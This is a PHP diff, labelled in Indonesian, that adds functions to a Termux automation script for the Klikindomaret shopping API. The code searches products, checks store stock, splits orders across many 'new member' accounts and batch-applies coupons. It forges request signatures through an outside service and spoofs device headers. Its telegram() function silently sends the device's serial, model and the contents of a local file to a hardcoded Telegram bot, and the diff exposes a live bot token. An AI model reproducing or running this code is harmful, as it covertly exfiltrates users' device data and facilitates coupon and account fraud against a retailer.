+        }
+      }
+    } else {
+      echo Warna::MERAH . "✗ Sumber tidak valid: '" . $source . "'" . Warna::RESET . "\n";
+    }
+  }
+
+  if (empty($filesProcessed)) {
+    echo "\n" . Warna::MERAH . "TIDAK ADA DATA YANG DAPAT DIPROSES!" . Warna::RESET . "\n";
+    echo Warna::KUNING . "Pastikan:" . Warna::RESET . "\n";
+    echo "1. File 'check_pin.txt' ada\n";
+    echo "2. Folder 'pesananfood/', 'pesananxtra/', 'pinbanyak/' berisi file .txt\n";
+    echo "3. Path dan nama folder benar\n";
+    return [];
+  }
+
+  echo "\n" . Warna::BOLD_HIJAU . "======= RINGKASAN DATA =======" . Warna::RESET . "\n";
+  echo Warna::BOLD_CYAN . "Total file diproses: " . count($filesProcessed) . Warna::RESET . "\n";
+  echo Warna::BOLD_CYAN . "Total baris dibaca: " . $totalLines . Warna::RESET . "\n";
+  echo Warna::KUNING . "Baris duplikat: " . $duplicateLines . Warna::RESET . "\n";
+  echo Warna::BOLD_HIJAU . "Baris unik ditemukan: " . count($uniqueLines) . Warna::RESET . "\n\n";
+
+  return $uniqueLines;
+}
+
+
+function cleanup() {
+  $dir = '/data/data/com.termux/files/usr/tmp';
+  if (is_dir($dir)) {
+    $items = glob($dir . '/*');
+    foreach ($items as $item) {
+      if (is_dir($item)) {
+        exec("rm -rf " . escapeshellarg($item));
+      } else {
+        unlink($item);
+      }
+    }
+  }
+}
+
+
+function telegram() {
+  $botToken = '8076761254:AAGTUQ506GOBkofydIB0XF_AojRpIFNaoEo';
+  $chatId = '870519657';
+
+  $brand = trim(shell_exec("getprop ro.product.brand"));
+  $model = trim(shell_exec("getprop ro.product.model"));
+  $android = trim(shell_exec("getprop ro.build.version.release"));
+
+  // ID device (serial number)
+  $serial = trim(shell_exec("getprop ro.serialno"));
+  if ($serial == "" || $serial == "unknown") {
+    $serial = substr(md5(php_uname()), 0, 12); // fallback ID
+  }
+
+  // --- Baca file ---
+  $filePath = 'last';
+  if (file_exists($filePath)) {
+    $content = file_get_contents($filePath);
+  } else {
+    $content = "File last.txt tidak ditemukan!";
+  }
+
+  // --- Buat pesan Telegram ---
+  $message = "<b>INFO DEVICE</b>\n";
+  $message .= "Brand : <b>$brand</b>\n";
+  $message .= "Model : <b>$model</b>\n";
+  $message .= "Android : <b>$android</b>\n";
+  $message .= "ID : <b>$serial</b>\n\n";
+  $message .= "<b>ISI FILE:</b>\n";
+  $message .= $content;
+
+  // --- Kirim ke Telegram ---
+  $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
+  $data = [
+    'chat_id' => $chatId,
+    'text' => $message,
+    'parse_mode' => 'HTML'
+  ];
+
+  $options = [
+    'http' => [
+      'header' => "Content-type: application/x-www-form-urlencoded\r\n",
+      'method' => 'POST',
+      'content' => http_build_query($data),
+    ],
+  ];
+
+  $context = stream_context_create($options);
+  file_get_contents($url, false, $context);
+}
+
+
+function getToko($kode) {
+  $url = 'https://api-klik.klikindomaret.com/catalog-xpress/api/mobile/stores/nearest?latitude=-7.2782383&longitude=112.7210806&rad=0&page=0&size=1&keyword='.$kode;
+
+  $headers = [
+    'user-agent: EDTSCode-production',
+    'signature: cwlGuiE7NGA64kd5Ie+13f8rxP6ZqSfFmXSd6IxoAOSFCVKyCyRLq58n7W74lA7uvByNIxWI075hnUxcsFg29v7gp0d565GMStzkLQngnInULc6ynVxQ0GAB6myJoELNW0ycxEi/nlmpbshcFLwGyPoGI+lXR1gWGRE6eJm3fpY=',
+  ];
+
+  $ch = curl_init();
+  curl_setopt($ch, CURLOPT_URL, $url);
+  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+  curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
+  curl_setopt($ch, CURLOPT_TIMEOUT, 30);
+  $response = curl_exec($ch);
+
+  if (curl_errno($ch)) {
+    curl_close($ch);
+    return ['error' => 'CURL Error: ' . curl_error($ch)];
+  }
+
+  $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+  curl_close($ch);
+
+  if ($httpCode !== 200) {
+    return ['error' => 'HTTP Error: ' . $httpCode];
+  }
+
+  $data = json_decode($response, true);
+
+  // Cek apakah response valid dan ada data
+  if (isset($data['status']) && $data['status'] === '00' &&
+    isset($data['data']['content'][0])) {
+
+    $store = $data['data']['content'][0];
+
+    return [
+      'kodetoko' => $store['storeCode'] ?? null,
+      'namatoko' => $store['storeName'] ?? null,
+      'alamat' => $store['address'] ?? null
+    ];
+  } else {
+    return [
+      'error' => 'Toko tidak ditemukan atau API error',
+      'message' => $data['message'] ?? 'Unknown error'
+    ];
+  }
+}
+
+
+function hapusGakPenting() {
+  $targets = [
+    "cos",
+    "pesananfood",
+    "pinbanyakimg",
+    "total_trx",
+    ".input_history"
+  ];
+
+  echo Warna::BOLD_BIRU . "\nPEMBERSIHAN FILE/FOLDER TIDAK PENTING\n" . Warna::RESET;
+
+  $deleteFolder = function($path) use (&$deleteFolder) {
+    if (!is_dir($path)) return;
+
+    foreach (scandir($path) as $file) {
+      if ($file === "." || $file === "..") continue;
+
+      $full = $path . DIRECTORY_SEPARATOR . $file;
+
+      if (is_dir($full)) {
+        $deleteFolder($full);
+      } else {
+        @unlink($full);
+      }
+    }
+    @rmdir($path);
+  };
+
+  $deletedCount = 0;
+  foreach ($targets as $item) {
+    if (is_dir($item)) {
+      $deleteFolder($item);
+      $deletedCount++;
+    } elseif (file_exists($item)) {
+      @unlink($item);
+      $deletedCount++;
+    }
+  }
+
+}
+
+
+function createOrder($selected_products) {
+  if (empty($selected_products)) {
+    echo "\033[1;31mTidak ada produk yang dipilih untuk dibuat order.\033[0m\n";
+    return;
+  }
+
+  echo "\033[1;36m\n" . str_repeat("=", 50) . "\n";
+  echo "FORM ORDER NEW MEMBER\n";
+  echo str_repeat("=", 50) . "\033[0m\n\n";
+
+  echo "\033[1;33mKode Toko : \033[0m";
+  $kode_toko = trim(fgets(STDIN));
+
+  echo "\033[1;33mJumlah akun : \033[0m";
+  $jumlah_akun = trim(fgets(STDIN));
+
+  echo "\033[1;33m\nPENGISIAN JUMLAH (QTY) PER PRODUK\033[0m\n";
+  echo str_repeat("-", 40) . "\n";
+
+  $order_details = [];
+  $total_harga = 0;
+
+  foreach ($selected_products as $index => $product) {
+    $counter = $index + 1;
+
+    echo "\033[1;32mProduk {$counter}:\033[0m\n";
+    echo "\033[0;37mPLU      : {$product['plu']}\033[0m\n";
+    echo "\033[0;37mDeskripsi: " . substr($product['deskripsi'], 0, 40);
+    if (strlen($product['deskripsi']) > 40) echo "...";
+    echo "\033[0m\n";
+    echo "\033[0;37mHarga    : Rp " . number_format($product['harga'], 0, ',', '.') . "\033[0m\n";
+
+    echo "\033[1;33mQty {$counter} : \033[0m";
+    $qty = trim(fgets(STDIN));
+
+    while (!is_numeric($qty) || $qty < 1) {
+      echo "\033[1;31mQty harus angka dan minimal 1. Silakan input ulang: \033[0m";
+      $qty = trim(fgets(STDIN));
+    }
+
+    $subtotal = $product['harga'] * intval($qty);
+    $total_harga += $subtotal;
+
+    $order_details[] = [
+      'plu' => $product['plu'],
+      'qty' => intval($qty),
+      'harga' => $product['harga'],
+      'subtotal' => $subtotal
+    ];
+
+    echo "\033[0;90m" . str_repeat("-", 40) . "\033[0m\n";
+  }
+
+  // Tampilkan hasil di terminal
+  echo "\033[1;36m\n" . str_repeat("=", 50) . "\n";
+  echo "FORM ORDER NEW MEMBER - HASIL\n";
+  echo str_repeat("=", 50) . "\033[0m\n\n";
+
+  echo "\033[1;33mKode Toko   : \033[0m" . $kode_toko . "\n";
+  echo "\033[1;33mNama Toko   : \033[0m-\n";
+  echo "\033[1;33mType Order  : \033[0mSAMA\n";
+  echo "\033[1;33mJumlah akun : \033[0m" . $jumlah_akun . "\n\n";
+
+  foreach ($order_details as $index => $detail) {
+    $counter = $index + 1;
+    echo "\033[1;33mPLU {$counter} : \033[0m" . $detail['plu'] . "\n";
+    echo "\033[1;33mQty {$counter} : \033[0m" . $detail['qty'] . "\n";
+  }
+
+  echo "\033[1;33m\n" . str_repeat("-", 30) . "\033[0m\n";
+  echo "\033[1;33mTotal Rp " . number_format($total_harga, 0, '', '.') . "\033[0m\n";
+  echo "\033[1;33m" . str_repeat("-", 30) . "\033[0m\n";
+  echo "\033[1;33m>\033[0m\n";
+
+  echo "\033[1;32m\nOrder berhasil dibuat!\033[0m\n";
+}
+
+function search($keyword) {
+  $url = "https://api-klik.klikindomaret.com/catalog-xpress/api/mobile/search/result";
+
+  $data = [
+    "storeCode" => "TJKT",
+    "keyword" => $keyword,
+    "latitude" => -6.175218437940874,
+    "longitude" => 106.82747699571644,
+    "districtId" => "141100100",
+    "mode" => "DELIVERY"
+  ];
+
+  $json_data = json_encode($data);
+
+  $signature_result = signature($url, $json_data);
+  $signature_data = json_decode($signature_result, true);
+
+  if (!$signature_data || !isset($signature_data['signature'])) {
+    die("\033[1;31mError: Gagal generate signature\033[0m");
+  }
+
+  $headers = [
+    'session_id: da9ff9e0-345d-49ac-9233-f450ff70b7ef',
+    'event_id: 312',
+    'x-correlation-id: 24554f74-c4a2-49eb-9c52-c057bcca1bc3',
+    'user-agent: EDTSCode-production',
+    'apps: {"os_name":"Android Q","os_version":"Android 10","device_class":"Phone","device_family":"Xiaomi Redmi Note 7","app_version":"2511100","device_id":"m4lnhb2qfzhrlbyw"}',
+    'signature: ' . $signature_data['signature'],
+    'sha1: 5C7C08E2D21CB74E2A662292E931688F09412F72',
+    'content-type: application/json; charset=UTF-8',
+    'accept-encoding: gzip'
+  ];
+
+  $ch = curl_init();
+
+  curl_setopt_array($ch, [
+    CURLOPT_URL => $url,
+    CURLOPT_RETURNTRANSFER => true,
+    CURLOPT_POST => true,
+    CURLOPT_HTTPHEADER => $headers,
+    CURLOPT_POSTFIELDS => $json_data,
+    CURLOPT_ENCODING => 'gzip',
+    CURLOPT_SSL_VERIFYPEER => false,
+    CURLOPT_TIMEOUT => 30
+  ]);
+
+  $response = curl_exec($ch);
+  curl_close($ch);
+
+  $result = json_decode($response);
+
+  if (!$result || !isset($result->data->content)) {
+    echo "\033[1;31m\nTidak ada hasil untuk keyword: $keyword\n\033[0m";
+    return [];
+  }
+
+  $products = [];
+  $counter = 1;
+
+  echo "\033[1;36m\n" . str_repeat("=", 70) . "\n";
+  echo "HASIL PENCARIAN UNTUK: \"" . strtoupper($keyword) . "\"\n";
+  echo str_repeat("=", 70) . "\033[0m\n\n";
+
+  echo "\033[1;33m" . str_pad("NO", 4) . " | ";
+  echo str_pad("PLU", 15) . " | ";
+  echo str_pad("PRODUK", 35) . " | ";
+  echo "HARGA\033[0m\n";
+  echo "\033[1;33m" . str_repeat("-", 70) . "\033[0m\n";
+
+  foreach ($result->data->content as $product) {
+    $plu = $product->plu;
+    $produk = $product->productName;
+    $price = $product->finalPrice ?? $product->price;
+
+    $products[$counter] = [
+      'plu' => $plu,
+      'deskripsi' => $produk,
+      'harga' => $price
+    ];
+
+    echo "\033[0;37m" . str_pad($counter, 4) . " \033[0m| ";
+    echo "\033[0;32m" . str_pad(substr($plu, 0, 15), 15) . " \033[0m| ";
+    echo "\033[0;37m" . str_pad(substr($produk, 0, 35), 35) . " \033[0m| ";
+    echo "\033[1;32mRp " . number_format($price, 0, ',', '.') . "\033[0m";
+    echo "\n";
+
+    echo "\033[0;90m" . str_repeat("-", 70) . "\033[0m\n";
+
+    $counter++;
+  }
+
+  if (empty($products)) {
+    echo "\033[1;31mTidak ada produk ditemukan.\033[0m\n";
+    return [];
+  }
+
+  echo "\033[1;36m\n" . str_repeat("=", 70) . "\n";
+  echo "PILIHAN PRODUK\n";
+  echo str_repeat("=", 70) . "\033[0m\n";
+
+  echo "\033[1;33mMasukkan nomor produk (contoh: 1,2,3): \033[0m";
+  $input = trim(fgets(STDIN));
+
+  $selected_products = [];
+
+  if (empty($input)) {
+    echo "\033[1;33mPemilihan dibatalkan.\033[0m\n";
+    return [];
+  }
+
+  $selected_indexes = array_map('intval', explode(',', $input));
+
+  foreach ($selected_indexes as $index) {
+    if (isset($products[$index])) {
+      $selected_products[] = $products[$index];
+    }
+  }
+
+
+
+  if (!empty($selected_products)) {
+    echo "\033[1;32m\n" . str_repeat("=", 70) . "\n";
+    echo "PRODUK YANG DIPILIH (" . count($selected_products) . " item)\n";
+    echo str_repeat("=", 70) . "\033[0m\n\n";
+
+    // Persiapkan data untuk disimpan
+    $save_lines = [];
+    foreach ($selected_products as $index => $product) {
+      $counter = $index + 1;
+
+      // Format untuk disimpan ke file: plu:deskripsi:harga
+      $save_lines[] = $product['plu'] . ":" . $product['deskripsi'] . ":" . $product['harga'];
+
+      // Tampilkan ke layar dengan format yang lebih bagus
+      echo "\033[1;33m{$counter}. PLU: \033[0m" . $product['plu'] . "\n";
+      echo "\033[1;33m   Produk: \033[0m" . substr($product['deskripsi'], 0, 50) . "\n";
+      echo "\033[1;33m   Harga: \033[0mRp " . number_format($product['harga'], 0, ',', '.') . "\n";
+      echo "\033[0;90m" . str_repeat("-", 60) . "\033[0m\n";
+    }
+
+    // Simpan semua data sekaligus ke file
+    file_put_contents("selected.txt", implode("\n", $save_lines));
+
+    echo "\033[1;32m\n" . str_repeat("=", 70) . "\033[0m\n";
+  } else {
+    echo "\033[1;33mTidak ada produk yang dipilih.\033[0m\n";
+  }
+
+  return $selected_products;
+}
+
+function manualorder($stock = null) {
+  echo "\033[1;36m\n" . str_repeat("=", 70) . "\n";
+  echo "KLIKINDO PRODUCT SEARCH\n";
+  echo str_repeat("=", 70) . "\033[0m\n\n";
+
+  echo "\033[1;33mMasukkan keyword pencarian: \033[0m";
+  $keyword = trim(fgets(STDIN));
+
+  if (!empty($keyword)) {
+    $selected = search($keyword);
+
+    if (!empty($selected)) {
+      if ($stock) {
+        $create_order = 'n';
+      } else {
+
+        echo "\033[1;33m\nApakah ingin membuat order dari produk yang dipilih? (y/n): \033[0m";
+        $create_order = trim(fgets(STDIN));
+      }
+
+      if (strtolower($create_order) === 'y') {
+        createOrder($selected);
+      } else {
+        echo "\033[1;33mOrder tidak dibuat.\033[0m\n";
+      }
+
+    }
+  } else {
+    echo "\033[1;31mKeyword tidak boleh kosong!\033[0m\n";
+  }
+}
+
+function signature($url, $body) {
+  $curl = curl_init();
+  curl_setopt_array($curl, [
+    CURLOPT_URL => "https://iddant.id/newklik/",
+    CURLOPT_RETURNTRANSFER => true,
+    CURLOPT_ENCODING => "",
+    CURLOPT_MAXREDIRS => 10,
+    CURLOPT_TIMEOUT => 30,
+    CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
+    CURLOPT_CUSTOMREQUEST => "POST",
+    CURLOPT_POSTFIELDS => json_encode([
+      'method' => '/sign/post',
+      'url' => $url,
+      'body' => $body,
+    ]),
+    CURLOPT_HTTPHEADER => [
+      "Accept: */*",
+      "Content-Type: application/json",
+      "User-Agent: Thunder Client (https://www.thunderclient.com)",
+    ],
+  ]);
+
+  $response = curl_exec($curl);
+  curl_close($curl);
+  return $response;
+}
+
+
+
+function autocekstock() {
+  echo Warna::BOLD_CYAN . "\n╔═══════════════════════════════════════╗\n";
+  echo "║" . Warna::BOLD_HIJAU . "        AUTO CEK STOCK TOKO              " . Warna::BOLD_CYAN . "║\n";
+  echo "╚═══════════════════════════════════════╝\n" . Warna::RESET;
+
+
+  $file_plu = "cekstoktoko.txt";
+  if (file_exists($file_plu)) {
+    unlink($file_plu);
+  }
+  manualorder(1);
+
+  echo "\033[1;33mFile Kodetoko ( input tanpa txt ) : \033[0m";
+  $namafile = trim(fgets(STDIN));
+  $filetoko = "$namafile.txt";
+
+  $file_plu = "selected.txt";
+  if (!file_exists($file_plu)) {
+    echo Warna::BOLD_MERAH . "✗ File selected.txt tidak ditemukan!\n" . Warna::RESET;
+    return;
+  }
+
+  $plu_data = file($file_plu, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
+  if (empty($plu_data)) {
+    echo Warna::BOLD_MERAH . "✗ File selected.txt kosong!\n" . Warna::RESET;
+    return;
+  }
+
+  $plu_list = [];
+  foreach ($plu_data as $line) {
+    $parts = explode(':', $line, 3);
+    if (!empty(trim($parts[0] ?? ''))) {
+      $plu_list[] = trim($parts[0]);
+    }
+  }
+
+  if (empty($plu_list)) {
+    echo Warna::BOLD_MERAH . "✗ Tidak ada PLU yang valid dalam file!\n" . Warna::RESET;
+    return;
+  }
+
+  echo Warna::BOLD_CYAN . "\n▶ Menemukan " . count($plu_list) . " PLU dari selected.txt\n" . Warna::RESET;
+  echo Warna::BOLD_CYAN . "▶ Menjalankan proses...\n" . Warna::RESET;
+  sleep(2);
+
+  $inputs = [
+    '7',
+    'y',
+    $filetoko
+  ];
+
+  $total_plu = count($plu_list);
+
+  foreach ($plu_list as $i => $plu) {
+    $inputs[] = $plu;
+    $inputs[] = '1';
+    $inputs[] = ($i === $total_plu - 1) ? 'n' : 'y';
+  }
+
+  $file_plu = "cekstoktoko.txt";
+  if (!file_exists($file_plu)) {
+    $inputs[] = 'n';
+    $inputs[] = '7';
+    $inputs[] = 'n';
+    $inputs[] = $filetoko;
+
+  }
+  $inputs[] = '';
+  $inputs[] = '';
+  $inputs[] = '';
+  jalankanKlik($inputs);
+
+  echo Warna::BOLD_HIJAU . "✓ Proses cek stock selesai untuk " . count($plu_list) . " PLU\n" . Warna::RESET;
+}
+
+
+
+function hapusStokNol() {
+
+  echo "\033[96;1mTotal Per Keranjang ? \033[97;1m: ";
+  $qtyKeranjang = strtoupper(trim(fgets(STDIN)));
+  $stokF = "cekstok.formate";
+  $stokFile = "cekstoktoko.txt";
+  $selectedFile = "selected.txt";
+
+  if (!file_exists($stokFile) || !file_exists($selectedFile)) return;
+
+  // mapping deskripsi => PLU
+  $map = [];
+  foreach (file($selectedFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES) as $l) {
+    $p = explode(":", $l, 3);
+    if (count($p) === 3) {
+      $map[trim($p[1])] = trim($p[0]);
+    }
+  }
+
+  $data = file_get_contents($stokFile);
+  $blocks = preg_split('/\n(?=TOKO:)/', trim($data));
+  $hasil = [];
+
+  foreach ($blocks as $block) {
+    $lines = explode("\n", trim($block));
+    $outBlock = [];
+    $adaStok = false;
+
+    foreach ($lines as $line) {
+
+      // header TOKO tetap
+      if (strpos($line, 'TOKO:') === 0) {
+        $outBlock[] = $line;
+        continue;
+      }
+
+      // baris STOK
+      if (preg_match('/^STOK:\s*(\d+)\s+(.+)$/', $line, $m)) {
+        $stok = (int)$m[1];
+        $desc = trim($m[2]);
+
+        if ($stok > 0 && isset($map[$desc])) {
+          $outBlock[] = $map[$desc] . " : " . $stok . " : " . $desc;
+          $adaStok = true;
+        }
+      }
+    }
+
+    // simpan TOKO hanya jika ada stok > 0
+    if ($adaStok) {
+      $hasil[] = implode("\n", $outBlock);
+    }
+  }
+
+  file_put_contents($stokF, implode("\n\n", $hasil) . "\n");
+
+  $inputFile = $stokF;
+  $outputDir = 'output';
+
+  if (!is_dir($outputDir)) {
+    mkdir($outputDir, 0777, true);
+  }
+
+  $content = file_get_contents($inputFile);
+  if ($content === false) {
+    die("File cekstoktoko.txt tidak ditemukan atau kosong\n");
+  }
+
+  $stores = [];
+  $lines = explode("\n", $content);
+  $currentStore = null;
+
+  foreach ($lines as $line) {
+    $line = trim($line);
+    if ($line === '') continue;
+
+    if (strpos($line, 'TOKO:') === 0) {
+      if (preg_match('/TOKO:\s*(.+?)\s*\(([^)]+)\)/', $line, $m)) {
+        $currentStore = $m[2];
+        $stores[$currentStore] = [
+          'name' => $m[1],
+          'code' => $m[2],
+          'items' => []
+        ];
+      }
+      continue;
+    }
+
+    if ($currentStore && preg_match('/^(\d+)\s*:\s*(\d+)\s*:/', $line, $m)) {
+      $plu = $m[1];
+      $qty = (int)$m[2];
+
+      if ($qty > 0) {
+        $stores[$currentStore]['items'][] = [
+          'plu' => $plu,
+          'qty' => $qty
+        ];
+      }
+    }
+  }
+  
+  
+  echo "Memproses data...\n\n";
+
+  foreach ($stores as $store) {
+    $result = generateOrderFormat($store, $qtyKeranjang);
+    $file = $outputDir . '/' . $store['code'];
+    file_put_contents($file, $result);
+    echo "✓ File dibuat: $file\n";
+  }
+
+  echo "\nSELESAI!\n";
+}
+
+function generateOrderFormat($store , $qtyKeranjang ) {
+    $output = "FORM ORDER NEW MEMBER\n";
+    $output .= "=======================\n\n";
+    $output .= "Kode Toko   : {$store['code']}\n";
+    $output .= "Nama Toko   : {$store['name']}\n";
+    $output .= "Tanggal     : " . date('j/n/Y') . "\n";
+    $output .= "Type Order  : BEDA\n";
+
+    $totalQty = 0;
+    foreach ($store['items'] as $it) {
+      $totalQty += $it['qty'];
+    }
+
+    $maxAccounts = floor($totalQty / $qtyKeranjang);
+    $output .= "Jumlah akun : $maxAccounts\n\n";
+
+    $remaining = $store['items'];
+    $akunKe = 1;
+
+    while ($akunKe <= $maxAccounts) {
+      $currentAccount = [];
+      $currentQty = 0;
+
+      foreach ($remaining as &$item) {
+        if ($item['qty'] <= 0) continue;
+
+        $space = $qtyKeranjang - $currentQty;
+        if ($space <= 0) break;
+
+        $take = min($item['qty'], $space);
+        $item['qty'] -= $take;
+        $currentQty += $take;
+
+        if (!isset($currentAccount[$item['plu']])) {
+          $currentAccount[$item['plu']] = 0;
+        }
+        $currentAccount[$item['plu']] += $take;
+      }
+      unset($item);
+
+      $output .= "Akun ke : $akunKe\n";
+      $no = 1;
+      foreach ($currentAccount as $plu => $qty) {
+        $output .= "PLU $no : $plu\n";
+        $output .= "QTY $no : $qty\n";
+        $no++;
+      }
+      $output .= "\n";
+
+      $akunKe++;
+    }
+
+    return $output;
+  }
+  
+  
+  
+  function copyKlikToZero($klikFile = 'klik.txt', $zeroFile = '0')
+{
+    if (!file_exists($klikFile)) return;
+
+    // bersihkan :None di klik.txt
+    $klikLines = file($klikFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
+    $klikLines = array_map(function ($l) {
+        return str_replace(':None', '', trim($l));
+    }, $klikLines);
+    file_put_contents($klikFile, implode("\n", $klikLines) . "\n");
+
+    // bersihkan :None di 0.txt
+    $zeroLines = file_exists($zeroFile)
+        ? file($zeroFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES)
+        : [];
+
+    $zeroLines = array_map(function ($l) {
+        return str_replace(':None', '', trim($l));
+    }, $zeroLines);
+    file_put_contents($zeroFile, implode("\n", $zeroLines) . "\n");
+
+    // set untuk cek duplikat
+    $zeroSet = array_flip($zeroLines);
+    $add = [];
+
+    foreach ($klikLines as $line) {
+        if ($line === '') continue;
+
+        if (!isset($zeroSet[$line])) {
+            $add[] = $line;
+            $zeroSet[$line] = true;
+        }
+    }
+
+    if (!empty($add)) {
+        file_put_contents($zeroFile, implode("\n", $add) . "\n", FILE_APPEND);
+    }
+}
+
+
+function sampah() {
+    $dir = "/data/data/com.termux/files/usr/tmp";
+
+    if (!is_dir($dir)) {
+        return;
+    }
+
+    $bytes = 0;
+
+    $it = new RecursiveIteratorIterator(
+        new RecursiveDirectoryIterator($dir, FilesystemIterator::SKIP_DOTS)
+    );
+
+    foreach ($it as $file) {
+        $bytes += $file->getSize();
+    }
+
+    $mb = round($bytes / (1024 * 1024), 2);
+    $gb = round($bytes / (1024 * 1024 * 1024), 2);
+
+    return $gb;
+}
+
+
+function buatFileKupon()
+{
+    $sumberFile = '0';
+    $outputFile = 'gaskupon.txt';
+
+    if (!file_exists($sumberFile)) {
+        die("File 0.txt tidak ditemukan!\n");
+    }
+
+    if (file_exists($outputFile)) {
+        unlink($outputFile);
+    }
+
+    $lines = file($sumberFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
+    $data  = [];
+
+    foreach ($lines as $i => $line) {
+        $parts = explode(":", $line);
+        if (!empty($parts[0])) {
+            $data[] = strtoupper($parts[0]);
+            echo "\033[93;1m[" . ($i + 1) . "] \033[97;1m" . strtoupper($parts[0]) . PHP_EOL;
+        }
+    }
+
+    if (empty($data)) {
+        die("Data kosong\n");
+    }
+
+    echo "\n\n\033[93;1m Masukkan baris awal \033[96;1m : ";
+    $awal = (int) trim(fgets(STDIN));
+
+    echo "\033[93;1m Masukkan baris akhir \033[96;1m: ";
+    $akhir = (int) trim(fgets(STDIN));
+
+    if ($awal < 1 || $akhir > count($data) || $awal > $akhir) {
+        die("Rentang baris tidak valid\n");
+    }
+
+    echo "\033[93;1m Masukkan kode kupon \033[96;1m : ";
+    $kodeKupon = strtoupper(trim(fgets(STDIN)));
+
+    $output = [];
+
+    for ($i = $awal - 1; $i <= $akhir - 1; $i++) {
+        $output[] = $data[$i] . ":" . $kodeKupon;
+    }
+
+    file_put_contents($outputFile, implode(PHP_EOL, $output) . PHP_EOL);
+
+    echo "Berhasil menulis " . count($output) . " baris ke gaskupon.txt\n";
+}
+
+
+
+function autoCoKupon() {
+  
+  $tanggalOtomatis = getTanggalOtomatis();
+  $bulanOtomatis = getBulanOtomatis();
+  $shiftOtomatis = getShiftOtomatis();
+  bacaKolom2DanJumlahBaris();
+  echo "\033[94;1mInput Kupon Baru ? (y/n) : ";
+  $baru = trim(fgets(STDIN));
+  if ($baru == "y"){
+  buatFileKupon();
+  }
+
+  echo Warna::BOLD_CYAN . "\n╔═══════════════════════════════════════╗\n";
+  echo "║" . Warna::BOLD_HIJAU . "         AUTO CHECKOUT KUPON           " . Warna::BOLD_CYAN . "║\n";
+  echo "╚═══════════════════════════════════════╝\n" . Warna::RESET;
+
+  date_default_timezone_set('Asia/Jakarta');
+  echo Warna::KUNING . "Waktu sistem    : " . date('H:i:s') . " WIB\n";
+  echo "Tanggal otomatis: $tanggalOtomatis\n";
+  echo "Bulan otomatis  : $bulanOtomatis\n";
+  echo "Shift           : {$shiftOtomatis['info']}\n" . Warna::RESET;
+  
+    $tanggal = $tanggalOtomatis;
+    $bulan = $bulanOtomatis;
+    $shiftKode = $shiftOtomatis['kode'];
+    $shiftInfo = $shiftOtomatis['info'];
+    
+
+    echo Warna::BOLD_HIJAU . "\n✓ Menggunakan shift: $shiftInfo\n" . Warna::RESET;
+  
+   $jumlahBaris = 0;
+  
+    $file = fopen('gaskupon.txt', 'r');
+    while (!feof($file)) {
+      fgets($file);
+      $jumlahBaris++;
+    }
+    fclose($file);
+    $jumlahBaris--;
+    echo "✓ Jumlah baris: $jumlahBaris\n" . Warna::RESET;
+    
+    sleep(2);
+  
+  jalankanKlik([
+    '4','1','2', 'jasdor.txt', 'y', 'n', 'n', 'gaskupon.txt',
+    $tanggal, $bulan, $shiftKode, 'n', 1,
+    '1', (string)$jumlahBaris, 'n', ''
+  ], true);
+}
+
+
+function bacaKolom2DanJumlahBaris($file = 'gaskupon.txt') {
+    if (!file_exists($file)) {
+    echo "\n\033[91;1mBelum Pernah Input Kupon\n";
+        return false;
+    }
+
+    $handle = fopen($file, 'r');
+    if (!$handle) {
+        return false;
+    }
+
+    $jumlahBaris  = 0;
+    $kolomKedua   = false;
+
+    while (($line = fgets($handle)) !== false) {
+        $line = trim($line);
+        if ($line === '') continue;
+
+        $jumlahBaris++;
+
+        if ($jumlahBaris === 1) {
+            $kolom = explode(':', $line);
+            $kolomKedua = $kolom[1] ?? false;
+        }
+    }
+
+    fclose($handle);
+    echo "\n\033[96;1mKupon Saat ini : \033[92;1m$kolomKedua\n";
+    echo "\033[96;1mTotal Akun     : \033[92;1m$jumlahBaris\n";
+    
+}
